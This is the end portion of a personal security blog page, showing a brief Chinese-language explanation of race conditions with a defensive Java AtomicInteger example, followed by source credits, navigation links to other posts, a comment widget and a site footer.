+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">漏洞描述：多个线程同时修改共享变量，导致数据不一致。</span><br><span class="line"></span><br><span class="line">防御方法：</span><br><span class="line"></span><br><span class="line">    使用锁或原子操作。</span><br><span class="line"></span><br><span class="line">    示例（Java）：</span><br><span class="line">    java</span><br><span class="line">    复制</span><br><span class="line"></span><br><span class="line">    <span class="keyword">import</span> java.util.concurrent.atomic.AtomicInteger;</span><br><span class="line"></span><br><span class="line">    <span class="type">AtomicInteger</span> <span class="variable">sharedResource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AtomicInteger</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">updateResource</span><span class="params">()</span> &#123;</span><br><span class="line">        sharedResource.incrementAndGet();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<h6 id="一些素材来源："><a href="#一些素材来源：" class="headerlink" title="一些素材来源："></a>一些素材来源：</h6><p><a target="_blank" rel="noopener" href="https://noa.pages.dev/posts/web_security/race_conditions/">Noah’s Blog</a></p>
+<p><a target="_blank" rel="noopener" href="https://chat.deepseek.com/">DeepSeek</a></p>
+
+        
+      </div>
+
+       
+        <footer class="article-footer">
+           
+        </footer>
+         
+    </div>
+    
+     
+  </div>
+  
+    
+<nav id="article-nav">
+  <a class="article-nav-btn left "
+    
+      href="/2025/04/19/Basic-ROP-Learning/"
+      title="Basic ROP Learning"
+     >
+    <i class="fa-solid fa-angle-left"></i>
+    <p class="title-text">
+      
+        Basic ROP Learning
+        
+    </p>
+  </a>
+  <a class="article-nav-btn right "
+    
+      href="/2025/02/06/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwnstack%E9%A2%98%E8%A7%A3/"
+      title="攻防世界-pwnstack题解"
+     >
+
+    <p class="title-text">
+      
+        攻防世界-pwnstack题解
+        
+    </p>
+    <i class="fa-solid fa-angle-right"></i>
+  </a>
+</nav>
+
+
+  
+</article>
+
+
+  
+  <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+  <div id="comment-card" class="comment-card">
+    <div class="main-title-bar">
+      <div class="main-title-dot"></div>
+      <div class="main-title">Comments </div>
+    </div>
+    <div id="vcomments"></div>
+  </div>
+  <script>
+      new Valine({"enable":true,"appId":null,"appKey":null,"placeholder":"Just go go","pageSize":10,"highlight":true,"serverURLs":null,"el":"#vcomments"});
+  </script>
+
+
+
+
+
+    </div>
+    <div id="footer-wrapper">
+      <footer id="footer">
+  
+  <div id="footer-info" class="inner">
+    
+    &copy; 2025 Hailin Zheng<br>
+    Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> & Theme <a target="_blank" rel="noopener" href="https://github.com/saicaca/hexo-theme-vivia">Vivia</a>
+  </div>
+</footer>
+
+    </div>
+    <div class="back-to-top-wrapper">
+    <button id="back-to-top-btn" class="back-to-top-btn hide" onclick="topFunction()">
+        <i class="fa-solid fa-angle-up"></i>
+    </button>
+</div>
+
+<script>
+    function topFunction() {
+        window.scroll({ top: 0, behavior: 'smooth' });
+    }
+    let btn = document.getElementById('back-to-top-btn');
+    function scrollFunction() {
+        if (document.body.scrollTop > 600 || document.documentElement.scrollTop > 600) {
+            btn.classList.remove('hide')
+        } else {
+            btn.classList.add('hide')
+        }
+    }
+    window.onscroll = function() {
+        scrollFunction();
+    }
+</script>
+
+  </div>
+  <script src="/js/light-dark-switch.js"></script>
+</body>
+</html>
